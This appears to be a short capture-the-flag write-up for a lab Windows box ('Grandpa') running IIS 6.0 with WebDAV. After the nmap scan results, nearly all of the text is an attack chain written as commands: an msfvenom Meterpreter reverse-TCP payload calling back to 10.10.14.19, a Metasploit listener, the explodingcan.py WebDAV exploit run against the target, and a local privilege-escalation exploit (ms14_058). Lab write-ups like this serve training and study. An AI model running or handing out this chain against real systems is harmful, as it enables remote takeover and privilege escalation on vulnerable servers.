# Grandpa

### Nmap

```
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|_  Server Date: Sun, 26 Jun 2022 10:37:40 GMT
```

### Exploitation # Priv Esc

```bash
# create payload
msfvenom -p windows/meterpreter/reverse_tcp -f raw -v sc -e x86/alpha_mixed LHOST=10.10.14.19 LPORT=4444 > shellcode

# set up lisner
msf > use multi/handler
msf exploit(multi/handler) > set payload payload/windows/meterpreter/reverse_tcp

# send payload and get shell
python explodingcan.py http://$IP shellcode

# PE
msf post(multi/recon/local_exploit_suggester) > exploit

msf exploit(windows/local/ms14_058_track_popup_menu) > run
```
